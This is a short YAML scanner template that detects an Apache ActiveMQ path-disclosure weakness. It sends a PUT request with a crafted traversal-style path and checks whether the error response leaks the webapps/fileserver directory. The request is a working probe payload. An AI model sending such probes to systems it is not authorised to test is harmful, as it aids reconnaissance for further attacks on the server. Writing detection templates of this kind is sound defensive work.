expression: r0()
id: activemq-path-disclosure
info:
  author: zan8in
  description: app="APACHE-ActiveMQ" && title=="Apache ActiveMQ"
  name: ActiveMQ Path Disclosure
  severity: info
  verified: true
rules:
  r0:
    expression: response.status == 500 && (response.raw.bcontains(b'\\webapps\\fileserver\\')
      || response.raw.bcontains(b'/webapps/fileserver/'))
    request:
      method: PUT
      path: /fileserver/a../../%08/..%08/.%08/%08\\
